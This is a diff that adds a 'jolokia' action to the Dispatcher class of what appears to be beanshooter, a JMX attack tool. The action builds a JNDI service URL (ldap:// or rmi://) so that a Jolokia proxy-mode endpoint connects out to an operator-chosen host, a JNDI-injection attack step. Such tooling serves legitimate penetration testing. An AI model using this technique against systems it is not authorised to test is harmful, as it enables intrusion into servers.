@@ -506,4 +506,34 @@ public class Dispatcher {
             disp.info();
         }
     }
+
+    /**
+     * Create an outbound RMI or LDAP connection from a Jolokia endpoint running in proxy mode.
+     */
+    public void jolokia()
+    {
+        BeanshooterOption.CONN_JOLOKIA.setValue(true);
+        PluginSystem.init(null);
+
+        String host = ArgumentHandler.require(BeanshooterOption.JOLOKIA_HOST);
+        int port = ArgumentHandler.require(BeanshooterOption.JOLOKIA_PORT);
+
+        String name = BeanshooterOption.JOLOKIA_LOOKUP.getValue("beanshooter");
+        String proxyUrl = "";
+
+        if (BeanshooterOption.JOLOKIA_LDAP.getBool())
+            proxyUrl = String.format("service:jmx:Rmi:///jndi/ldap://%s:%d/%s", host, port, name);
+
+        else
+            proxyUrl = String.format("service:jmx:Rmi:///jndi/rmi://%s:%d/%s", host, port, name);
+
+        BeanshooterOption.CONN_JOLOKIA_PROXY.setValue(proxyUrl);
+        Logger.printlnMixedYellow("Attempting to trigger outboud connection to", String.format("%s:%d", host, port));
+        Logger.printlnMixedBlue("Using proxy service URL:", proxyUrl);
+
+        MBeanServerClient mBeanServerClient = getMBeanServerClient();
+        mBeanServerClient.getMBeans();
+
+        Logger.printlnMixedYellow("Obtained", "no Exception", "while performing the list operation via the specified proxy.");
+    }
 }
